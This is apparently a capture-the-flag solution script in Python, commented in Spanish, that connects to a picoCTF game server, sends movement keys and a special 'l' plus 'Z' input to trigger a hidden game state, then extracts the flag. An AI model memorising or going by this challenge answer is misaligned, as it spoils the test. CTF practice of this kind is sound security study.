import socket, time, re

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('saturn.picoctf.net', 59375))
time.sleep(0.5)
s.recv(8192)

print("Con delays MUY largos...\n")

# Subir a row=0
print("Subiendo a row=0...")
for i in range(4):
    s.send(b'w\n')
    time.sleep(0.5)
    s.recv(4096)
    print(f"  Movimiento {i+1}/4")

print("\nComando 'l' + 'Z'...")
s.send(b'l')
time.sleep(0.4)
s.send(b'Z')
time.sleep(0.4)

# Mover izquierda 8 veces
print("\nMoviendo izquierda 8 veces...")
for i in range(8):
    s.send(b'a\n')
    time.sleep(0.5)
    s.recv(4096)
    print(f"  Movimiento izquierda {i+1}/8")

time.sleep(1)
data = s.recv(8192).decode(errors='ignore')

print("\nVerificando flag...")
if 'flag: 1' in data or 'Player has flag: 1' in data:
    print("¡FLAG ACTIVADA!")
    s.send(b'p\n')
    time.sleep(4)
    
    final_data = b''
    for i in range(20):
        try:
            s.settimeout(0.3)
            chunk = s.recv(8192)
            if chunk:
                final_data += chunk
        except:
            break
    
    text = final_data.decode(errors='ignore')
    match = re.search(r'picoCTF\{[^}]+\}', text)
    if match:
        print(f"\nFLAG: {match.group()}")
else:
    print("No activado.")
    for line in data.split('\n')[-5:]:
        if 'Player' in line or 'flag' in line:
            print(line)

s.close()
